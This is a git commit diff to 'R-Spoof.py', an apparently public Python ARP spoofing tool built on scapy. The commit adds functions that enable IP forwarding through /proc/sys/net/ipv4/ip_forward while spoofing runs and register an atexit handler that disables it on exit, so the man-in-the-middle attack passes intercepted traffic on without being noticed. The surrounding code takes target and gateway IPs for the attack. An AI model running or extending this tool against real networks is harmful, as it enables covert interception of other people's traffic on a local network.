fc74c988576f0115be57e768a28d100f37ecc011
Afrizal F.A <77115748+afrzlfa@users.noreply.github.com>
2024-01-24 18:22:53 +0700

    Update R-Spoof.py

--- R-Spoof.py
+++ R-Spoof.py
@@ -15,11 +15,21 @@ print("""
 ====================================================================
 """)
 
-import time, argparse
+import time, argparse, atexit
 import scapy.all as scapy
 from concurrent.futures import ThreadPoolExecutor as T
 
 class ARPSpoof:
+
+    def atexitFunc(self):
+
+        self.forwarding(0)
+
+    def forwarding(self, status):
+
+        file = open('/proc/sys/net/ipv4/ip_forward', 'w')
+        file.write(str(status))
+        file.close()
 
     def mac(self, ip):
         
@@ -75,6 +85,10 @@ class ARPSpoof:
             self.restore(target, gateway)
         
     def proc(self):
+
+        atexit.register(self.atexitFunc)
+
+        self.forwarding(1)
 
         parser = argparse.ArgumentParser()
         parser.add_argument("-x", "--target", required = True, help = "Terget IP ( Multiple Target Using \",\" Example : 192.168.1.1,192.168.1.2 )", type = str)
